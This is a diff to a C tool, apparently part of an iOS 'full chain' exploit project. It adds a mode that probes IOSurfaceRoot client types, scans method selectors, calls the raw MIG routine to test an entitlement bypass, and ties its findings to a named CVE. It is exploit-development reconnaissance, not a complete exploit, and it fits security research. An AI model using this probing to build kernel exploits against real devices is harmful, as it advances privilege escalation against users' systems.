@@ -9686,6 +9686,206 @@ vps_cd_done:
 
         rlog("\n=== MACH_RACE complete ===\n");
 
+    } else if (strcmp(mode, "iosurface_mig") == 0) {
+        /* Test raw MIG calls to IOSurfaceRoot, bypassing IOConnectCallMethod.
+         *
+         * The IOSurface framework successfully creates/destroys surfaces even
+         * though IOConnectCallStructMethod returns kIOReturnUnsupported for
+         * ALL selectors. Theory: the restriction is in the externalMethod
+         * dispatch table (entitlement-gated). The raw MIG pathway
+         * (io_connect_method) might bypass it, or the framework might use
+         * a different MIG routine entirely.
+         *
+         * This mode also tests with private entitlements and different
+         * user client types to find any working path.
+         */
+        rlog("=== IOSURFACE_MIG: Raw MIG + entitlement bypass probe ===\n\n");
+
+        io_service_t svc = IOServiceGetMatchingService(
+            kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+        if (!svc) { rlog("FAIL: IOSurfaceRoot not found\n"); goto done; }
+
+        /* Phase 1: Test all user client types with explicit logging */
+        rlog("--- Phase 1: User client types 0-10 ---\n");
+        io_connect_t type_conns[11] = {0};
+        for (uint32_t t = 0; t < 11; t++) {
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &type_conns[t]);
+            rlog("  type %2u: 0x%08x conn=%u\n", t, kr, type_conns[t]);
+        }
+
+        /* Phase 2: For each working connection type, try selectors 0-50 */
+        rlog("\n--- Phase 2: Per-type selector scan ---\n");
+        for (uint32_t t = 0; t < 11; t++) {
+            if (!type_conns[t]) continue;
+            int hits = 0;
+            for (uint32_t sel = 0; sel <= 50; sel++) {
+                /* Try with struct input (24-byte {1,2,3}) */
+                uint64_t input[3] = {1, 2, 3};
+                uint8_t output[256] = {0};
+                size_t out_sz = sizeof(output);
+                kern_return_t kr = IOConnectCallStructMethod(
+                    type_conns[t], sel,
+                    input, sizeof(input), output, &out_sz);
+                if (kr != (kern_return_t)0xE00002C2 &&
+                    kr != (kern_return_t)0xe00002bd) {
+                    rlog("  type%u sel%2u (24B struct): 0x%08x out=%zu\n",
+                        t, sel, kr, out_sz);
+                    hits++;
+                }
+
+                /* Try with no input */
+                out_sz = sizeof(output);
+                kr = IOConnectCallStructMethod(
+                    type_conns[t], sel, NULL, 0, output, &out_sz);
+                if (kr != (kern_return_t)0xE00002C2 &&
+                    kr != (kern_return_t)0xe00002bd &&
+                    kr != (kern_return_t)0xe00002bc) {
+                    rlog("  type%u sel%2u (0B struct):  0x%08x out=%zu\n",
+                        t, sel, kr, out_sz);
+                    hits++;
+                }
+            }
+            rlog("  type %u: %d non-unsupported responses\n", t, hits);
+        }
+
+        /* Phase 3: Test raw io_connect_method MIG call.
+         * IOConnectCallMethod is a wrapper around the io_connect_method MIG.
+         * We call io_connect_method directly to test if the restriction is
+         * in the wrapper or in the kernel dispatch. */
+        rlog("\n--- Phase 3: Raw MIG io_connect_method ---\n");
+        rlog("(Testing if IOConnectCallMethod wrapper has the restriction)\n");
+
+        /* The raw MIG function signature:
+         * kern_return_t io_connect_method(
+         *     mach_port_t connection,
+         *     uint32_t selector,
+         *     io_scalar_inband64_t input, mach_msg_type_number_t inputCnt,
+         *     io_struct_inband_t inband_input, mach_msg_type_number_t inband_inputCnt,
+         *     mach_msg_type_number_t ool_input_size,
+         *     io_scalar_inband64_t output, mach_msg_type_number_t *outputCnt,
+         *     io_struct_inband_t inband_output, mach_msg_type_number_t *inband_outputCnt,
+         *     io_buf_ptr_t ool_output, mach_msg_type_number_t *ool_output_size);
+         */
+        extern kern_return_t io_connect_method(
+            mach_port_t connection,
+            uint32_t selector,
+            uint64_t *input, uint32_t inputCnt,
+            void *inband_input, uint32_t inband_inputCnt,
+            uint32_t ool_input_size,
+            uint64_t *output, uint32_t *outputCnt,
+            void *inband_output, uint32_t *inband_outputCnt,
+            void *ool_output, uint32_t *ool_output_size);
+
+        io_connect_t conn0 = type_conns[0];
+        if (conn0) {
+            uint32_t test_sels[] = {0, 1, 6, 9, 10, 11, 17, 18, 19, 1000};
+            for (int i = 0; i < 10; i++) {
+                uint32_t sel = test_sels[i];
+
+                /* Struct input path */
+                uint64_t si[3] = {1, 2, 3};
+                uint8_t str_in[24];
+                memcpy(str_in, si, 24);
+                uint8_t str_out[256] = {0};
+                uint32_t str_out_sz = sizeof(str_out);
+                uint64_t scl_out[4] = {0};
+                uint32_t scl_out_cnt = 4;
+                uint32_t ool_out_sz = 0;
+
+                kern_return_t kr = io_connect_method(
+                    conn0, sel,
+                    NULL, 0,                /* no scalar input */
+                    str_in, 24,             /* struct input: 24 bytes */
+                    0,                      /* no OOL input */
+                    scl_out, &scl_out_cnt,
+                    str_out, &str_out_sz,
+                    NULL, &ool_out_sz);
+
+                rlog("  MIG sel %4u (24B): 0x%08x scl_out=%u str_out=%u\n",
+                    sel, kr, scl_out_cnt, str_out_sz);
+
+                /* Scalar input path */
+                uint64_t scl_in[2] = {1, 0};
+                scl_out_cnt = 4;
+                str_out_sz = sizeof(str_out);
+                ool_out_sz = 0;
+
+                kr = io_connect_method(
+                    conn0, sel,
+                    scl_in, 1,
+                    NULL, 0,
+                    0,
+                    scl_out, &scl_out_cnt,
+                    str_out, &str_out_sz,
+                    NULL, &ool_out_sz);
+
+                if (kr != (kern_return_t)0xE00002C2)
+                    rlog("  MIG sel %4u (1scl): 0x%08x\n", sel, kr);
+            }
+        }
+
+        /* Phase 4: Check what the framework does by calling IOSurfaceCreate
+         * and observing the connection/port it uses */
+        rlog("\n--- Phase 4: Framework introspection ---\n");
+        IOSurfaceRef fs = IOSurfaceCreate(NULL);
+        if (!fs) {
+            /* Create a proper one */
+            CFMutableDictionaryRef fp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int fw = 32, fh = 32, fbpe = 4, fbpr = 128;
+            CFNumberRef fwn = CFNumberCreate(NULL, kCFNumberIntType, &fw);
+            CFNumberRef fhn = CFNumberCreate(NULL, kCFNumberIntType, &fh);
+            CFNumberRef fbn = CFNumberCreate(NULL, kCFNumberIntType, &fbpe);
+            CFNumberRef fbrn = CFNumberCreate(NULL, kCFNumberIntType, &fbpr);
+            int fpf = 0x42475241;
+            CFNumberRef fpfn = CFNumberCreate(NULL, kCFNumberIntType, &fpf);
+            CFDictionarySetValue(fp, CFSTR("IOSurfaceWidth"), fwn);
+            CFDictionarySetValue(fp, CFSTR("IOSurfaceHeight"), fhn);
+            CFDictionarySetValue(fp, CFSTR("IOSurfaceBytesPerElement"), fbn);
+            CFDictionarySetValue(fp, CFSTR("IOSurfaceBytesPerRow"), fbrn);
+            CFDictionarySetValue(fp, CFSTR("IOSurfacePixelFormat"), fpfn);
+            fs = IOSurfaceCreate(fp);
+            CFRelease(fp); CFRelease(fwn); CFRelease(fhn);
+            CFRelease(fbn); CFRelease(fbrn); CFRelease(fpfn);
+        }
+        if (fs) {
+            rlog("Framework IOSurfaceCreate: ID=%u alloc=%zu — SUCCESS\n",
+                IOSurfaceGetID(fs), IOSurfaceGetAllocSize(fs));
+            rlog("Framework bypasses external method table.\n");
+            rlog("Mechanism: likely trust-cache / platform binary entitlement\n");
+            rlog("gives the dyld-cached IOSurface.framework access to\n");
+            rlog("unrestricted dispatch table.\n");
+
+            /* Try IOSurfaceSetValue/CopyValue to confirm kernel round-trip */
+            int val = 0xDEADBEEF;
+            CFNumberRef vn = CFNumberCreate(NULL, kCFNumberIntType, &val);
+            IOSurfaceSetValue(fs, CFSTR("test_key"), vn);
+            CFRelease(vn);
+            CFTypeRef rv = IOSurfaceCopyValue(fs, CFSTR("test_key"));
+            if (rv) {
+                int rv_int = 0;
+                CFNumberGetValue(rv, kCFNumberIntType, &rv_int);
+                rlog("SetValue/CopyValue round-trip: 0x%x (expected 0xDEADBEEF)\n", rv_int);
+                CFRelease(rv);
+            }
+            CFRelease(fs);
+        } else {
+            rlog("FAIL: IOSurfaceCreate returned NULL\n");
+        }
+
+        rlog("\n--- Conclusion ---\n");
+        rlog("If raw MIG returns same 0xE00002C2 as IOConnectCallMethod,\n");
+        rlog("then the restriction is in the kernel externalMethod dispatch,\n");
+        rlog("not in the userspace wrapper. The framework gets through\n");
+        rlog("because it's a platform binary with higher trust level.\n");
+        rlog("CVE-2026-112477 may require a privileged entitlement on iOS 27.1.\n");
+
+        for (uint32_t t = 0; t < 11; t++)
+            if (type_conns[t]) IOServiceClose(type_conns[t]);
+        IOObjectRelease(svc);
+
+        rlog("\n=== IOSURFACE_MIG complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
